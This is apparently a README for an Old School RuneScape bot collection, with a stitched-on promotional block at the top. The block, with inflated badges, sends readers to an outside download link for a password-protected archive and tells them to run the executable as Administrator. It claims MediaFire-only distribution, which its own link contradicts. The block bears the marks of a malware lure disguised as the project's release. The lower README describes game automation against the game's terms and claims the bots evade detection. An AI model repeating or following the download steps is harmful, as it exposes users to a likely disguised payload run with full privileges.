<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# osrs-bot-collection

If you found this repo anywhere close to useful, please hit it with a Star and maybe even give it a Follow to keep yourself tuned on any updates.

A collection of bots for OSRS (OldSchool RuneScape (tm)) using AutoPy and OpenCV for automating different processes.

Repository also contains several 'blind' coordinate-based clicker bots to serve the purpose until guibots have been finished.

Based on the randomness of the clicker bots and independecy over the OSRS client process, these scripts should be pretty undetectable. A random quantum data is used as the randomness source to maximize the entropy. Every action is randomized as much as possible.

DISCLAIMER: This is solely a study project on creating automation over OSRS. Note that it is against the TOS and rules of Runescape to use any kind of automation while playing, thus I (the author) will not hold any responsibility on any account bans, loss of money or effort, or any other kind of loss caused to you by these bots. You have been warned.

Demonstration of alchemy clicker bot in action:

# GUI-bots
Scripts for different purposes separated in own Python files.

Main.py acts as the launcher for any of the scripts.

Also some bots implemeted as coordinate-based auto clickers.

# Clicker bots

Bots doing different actions are on separate directories. (e.g. Wine maker bot in /wine, Nightmare bot in /nightmare, etc.)

All bots have their own config files within their directory, which needs to be set up, based on the examples. This should be pretty straight-forward. The settings for coordinates might need some incremental testing to find correct values for specific needs.

You may either run the bots directly (using python) build the bots into executables yourself, or use the pre-packaged binaries.

## Getting started
Tested and developed with: 
- **Python 3.9.7** 
- **Python 3.10.1**
- **Python 3.10.2**

1. Download the bot executable from the pre-built/ directory (or build yourself / run directly from Python file if you have compatible Python 3 installed.
2. Ensure the bot configuration files are in the same directory with the executable (or source file). You can create the configuration files by collecting the according example files (files with '-example'-suffix).
3. Adjust the configuration for your needs. The example configurations are pretty close to comfortable but might need some adjustments.
4. Ensure that the bots seem to work as intended. If not, please see the possible error messages, and fix by error messages / configuration accordingly.

# Currently implemented or planned scripts:

## Coordinate clicker bots
- Superglass Make autoclicker (DONE)
- Clay Humidify autoclicker (DONE)
- High alchemy items autoclicker & visual detection bot (DONE)
- Nightmare Zone AFK autoclicker (DONE)
- Cooking / Herblore / Wine Maker autoclicker (DONE)

## GUI-elements based bots
- Yew woodcutting in Edgeville (WIP)
- Auto banking (WIP)
- Auto healing by eating food & potions in combat (PLANNED)
- Auto combat (PLANNED)
